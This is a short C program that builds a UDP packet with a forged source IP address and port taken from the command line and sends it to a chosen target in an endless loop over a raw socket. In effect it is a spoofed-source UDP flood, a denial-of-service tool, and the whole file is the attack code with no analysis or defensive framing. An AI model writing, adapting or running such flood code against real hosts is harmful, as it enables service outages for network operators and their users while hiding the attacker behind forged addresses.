#include "rata.h"

int main(int argc,char** argv)
{
    check_arguments(argc,argv);
    int sock_fd;
    sock_fd=socket(AF_INET,SOCK_RAW,IPPROTO_UDP);
    check_function(sock_fd,"socket");
    setuid(getuid());
    int status;
    const int on=1;
    status=setsockopt(sock_fd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on));
    const size_t buffer_length=sizeof(ip_hdr)+sizeof(udp_hdr);
    char buffer[buffer_length];
    struct sockaddr_in target_addr;
    struct sockaddr_in source_addr;
    socklen_t addr_len=sizeof(struct sockaddr_in);
    fill_addr(argv[1],argv[2],&source_addr);
    fill_addr(argv[3],argv[4],&target_addr);
    fill_buffer(&target_addr,&source_addr,buffer,buffer_length);

    while(TRUE)
    {
        status=sendto(sock_fd,buffer,buffer_length,0,(struct sockaddr*)&target_addr,addr_len);
        check_function(status,"sendto");
    }

    return 0;
}